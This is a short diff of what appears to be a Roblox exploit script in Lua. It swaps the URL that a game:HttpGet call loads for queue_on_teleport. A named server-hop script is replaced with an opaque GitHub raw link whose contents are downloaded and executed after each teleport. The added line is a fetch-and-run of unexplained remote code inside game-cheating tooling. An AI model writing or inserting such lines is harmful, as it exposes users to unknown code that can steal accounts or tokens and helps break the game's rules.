@@ -145,7 +145,7 @@ end
 
 -- Full script text for queue_on_teleport
 local SCRIPT_STRING = [[
-]] .. game:HttpGet("https://raw.githubusercontent.com/user/spooky-serverhop/main/spooky.lua") .. [[
+]] .. game:HttpGet("https://raw.githubusercontent.com/ASUJIFVsadvf/sigma/refs/heads/main/gg") .. [[
 ]]
 
 -- Main loop
